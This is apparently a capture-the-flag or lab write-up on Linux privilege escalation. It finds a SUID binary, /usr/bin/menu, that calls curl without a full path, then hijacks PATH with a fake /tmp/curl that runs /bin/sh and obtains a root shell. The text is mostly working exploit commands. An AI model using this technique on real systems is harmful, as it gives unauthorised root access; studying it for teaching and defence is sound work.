# Privilege Escalation

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Suspicious binary discovered:

```
/usr/bin/menu
```

Analyze binary:

```bash
strings /usr/bin/menu
```

The binary calls system commands without full paths:

```
curl
uname
ifconfig
```

This allows PATH hijacking.

Create a fake curl binary:

```bash
echo "/bin/sh" > /tmp/curl
chmod +x /tmp/curl
```

Modify PATH variable:

```bash
export PATH=/tmp:$PATH
```

Run the vulnerable binary:

```bash
/usr/bin/menu
```

Select option:

```
1
```

Root shell obtained.
